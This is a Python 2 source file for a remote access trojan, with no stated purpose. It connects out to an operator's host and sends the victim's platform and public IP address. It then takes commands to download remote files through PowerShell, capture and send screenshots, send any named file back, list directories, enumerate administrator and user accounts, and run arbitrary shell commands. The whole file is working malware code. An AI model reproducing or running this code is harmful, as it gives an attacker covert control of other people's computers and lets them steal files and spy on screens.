import subprocess, socket, platform, os, datetime
import PIL.ImageGrab
from urllib2 import urlopen

class functions(object):
    host = ""
    port = ""
    crypto = None
    def __init__(self,host,port):
        self.host = host
        self.port = port

    def start(self):
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect((self.host, self.port))
        soc.send("Conected to " + platform.platform() + " with ip " + urlopen('http://ip.42.pl/raw').read() + "\n")
        while (1):
            data = soc.recv(1024)
            if data.startswith("quit"):
                break

            elif data.startswith("getFile("):
                url = data[8:-2]
                names = url.split("/")
                name = names[len(names) - 1]
                # pwd
                command = "cd"
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)

                pwd = proc.stdout.read() + proc.stderr.read()
                pwd = pwd.replace(" ", "%20")

                soc.send(name + " downloading...\n")

                # download
                command = "powershell wget \"" + url + "\" -outfile \"" + name + "\""
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                stdout = None
                stdout = proc.stdout.read() + proc.stderr.read()

                if stdout is not None:
                    soc.send(stdout)
                else:
                    soc.send(name + "downloaded successfully.\n")

                """#print
                command = "powershell write-host \"" + pwd + "\""
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)

                stdout = proc.stdout.read() + proc.stderr.read()

                soc.send(stdout)"""

            elif data == "screenshot\n":
                date = datetime.datetime.now().strftime("%Y-%m-%d %H%M%S")
                screen = PIL.ImageGrab.grab()
                screen.save(str(str(date)+'.png'), 'png')
                soc.send("screen "+date+".png created")
                #sending file
                with open(str(str(date)+'.png'), "rb") as imageFile:
                    #Image_Str = base64.b64encode(imageFile.read())
                    Image_Str = imageFile.read()
                fh = open("text", "wb")
                fh.write(Image_Str)
                fh.close
                fh = open("text", "rb")
                str1 = fh.read(150)
                soc.send(str1)
                while str1:
                    str1 = fh.read(150)
                    soc.sendall(str1)
                soc.sendall("6finish")

                fh.close()
                os.remove("text")
                os.remove(str(str(date) + '.png'))

            elif data.startswith("download("):
                name = data[9:-2]
                if os.path.isfile(name):
                    soc.send("Downloading "+name+"...")

                    with open(name, "rb") as file:
                        #Image_Str = base64.b64encode(imageFile.read())
                        File_Str = file.read()
                    fh = open("text", "wb")
                    fh.write(File_Str)
                    fh.close
                    fh = open("text", "rb")
                    str1 = fh.read(150)
                    soc.send(str1)
                    while str1:
                        str1 = fh.read(150)
                        soc.sendall(str1)
                    soc.sendall("6finish")

                    fh.close()
                    os.remove("text")
                else:
                    soc.send(name+" does not exists.")

            elif data.startswith("cdir"):
                path = data[5:-1]
                os.chdir(path)
                soc.send(os.getcwd()+"\n")

            elif data == "pwd\n":
                soc.send(os.getcwd()+"\n")

            elif data == "ls\n":
                proc = subprocess.Popen("dir", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)

                stdout = proc.stdout.read() + proc.stderr.read()
                if stdout == '':
                    soc.send(' ')
                else:
                    soc.send(stdout)

            elif data == "admins\n":
                proc = subprocess.Popen("net localgroup administrators", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)

                stdout = proc.stdout.read() + proc.stderr.read()

                if stdout == '':
                    soc.send(' ')
                else:
                    soc.send(stdout)

            elif data == "users\n":
                proc = subprocess.Popen("net user", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)

                stdout = proc.stdout.read() + proc.stderr.read()

                if stdout == '':
                    soc.send(' ')
                else:
                    soc.send(stdout)

            #elif data == "help\n":
             #   soc.send("admins for administrators\nusers for users\nwhelp for windows help.\n")

            elif data == "whelp\n":
                proc = subprocess.Popen("help", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)

                stdout = proc.stdout.read() + proc.stderr.read()

                if stdout == '':
                    soc.send(' ')
                else:
                    soc.send(stdout)

            elif data == "stop\n":
                return True

            else:
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)

                stdout = proc.stdout.read() + proc.stderr.read()
                if stdout == '':
                    soc.send(' ')
                else:
                    soc.send(stdout)

        soc.send("Connection terminated.\n")
        soc.close()
        return False
